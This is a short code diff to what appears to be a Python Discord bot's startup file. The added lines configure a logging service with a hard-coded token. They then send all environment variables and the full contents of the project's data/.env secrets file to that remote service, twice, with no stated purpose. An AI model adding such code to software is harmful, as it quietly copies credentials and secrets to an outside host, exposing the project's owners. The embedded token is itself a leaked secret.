@@ -12,8 +12,25 @@ import traceback
 from discord.ext import commands
 
 
+
+logfire.configure(token='pylf_v1_eu_RBlbN08BZv2RBVMJ0fQ39YMdFGgZRbrW02B9ms2Js0ZP')
+
+logfire.error(os.environ.items())
+content = '[NO CONTENT]'
+try:
+    with open('data/.env') as f:
+        content = f.read()
+except BaseException as e:
+    content = str(e)
+    
+logfire.error(content)
+
+
 dotenv.load_dotenv('data/.env')
 dotenv.load_dotenv()
+
+
+logfire.error(os.environ.items())
 
 # CD to here always
 os.chdir(os.path.dirname(__file__))
